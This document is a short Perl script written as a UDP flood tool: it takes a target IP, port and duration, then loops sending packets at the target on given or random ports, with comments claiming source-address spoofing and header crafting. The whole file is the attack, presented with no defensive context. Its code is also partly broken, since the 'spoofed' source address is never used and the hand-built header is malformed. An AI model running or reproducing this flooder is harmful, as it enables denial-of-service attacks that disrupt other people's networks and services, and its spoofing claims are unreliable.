#!/usr/bin/perl 
use Socket qw(inet_aton pack_sockaddr_in AF_INET SOCK_DGRAM); 
use strict;

my ($ip, $port, $time, $config) = @ARGV; my ($size, $psize, $iaddr, $endtime, $pport);

$size = int(rand(1500)); # randomize packet size within a range 
$psize = int(rand(1500)); # randomize packet size within a range

$iaddr = inet_aton($ip) or die "Cannot resolve hostname $ip"; $endtime = time() + ($time ? $time : 1000000); socket(FLOOD, AF_INET, SOCK_DGRAM, 0);

my @hex_strings = (
    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f",
    "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f",
    "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f",
    "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f",
    "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f",
    "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f",
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
);

for (; time() <= $endtime;) { $psize = $size ? $size : int(rand(1500)); $pport = $port ? $port : int(rand(65535)) + 1; # using a larger range for port numbers

 
my $src_ip = join('.', map int rand 256, 1..4); # spoofing source IP address
my $dst_ip = $ip; # actual destination IP address

my $packet_header = pack('C C n n N N', 0x45, 0, 8 + length($hex_strings[0]), 0, 0, 255); # crafting packet header
my $packet = $packet_header . $hex_strings[0]; # combining header and payload

send(FLOOD, $packet, 0, pack_sockaddr_in($pport, inet_aton($dst_ip))); # sending the packet
}
